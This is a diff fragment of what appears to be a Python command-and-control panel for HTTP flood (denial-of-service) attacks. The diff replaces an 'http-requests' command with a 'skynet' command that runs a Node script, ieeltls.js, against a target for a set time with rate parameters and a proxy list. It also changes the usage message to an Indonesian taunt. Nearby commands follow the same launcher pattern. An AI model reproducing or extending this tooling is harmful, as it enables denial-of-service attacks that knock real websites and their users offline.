@@ -550,15 +550,14 @@ def main():
                 print('Usage: http-raw <url> <time>')
                 print('Example: http-raw http://example.com 60')
 
-        elif "http-requests" in cnc:
+        elif "skynet" in cnc:
             try:
-                url = cnc.split()[1]
+                target = cnc.split()[1]
                 time = cnc.split()[2]
-                os.system(f'node HTTP-REQUESTS {url} {time}')
+                os.system(f'node ieeltls.js {target} {time} 2500 5000 proxies.txt')
             except IndexError:
-                print('Usage: http-requests <url> <time>')
-                print('Example: http-requests http://example.org 60')
-
+                print('ketik yg bener, salah itu yg lu ketik')
+             
         elif "http-rand" in cnc:
             try:
                 url = cnc.split()[1]
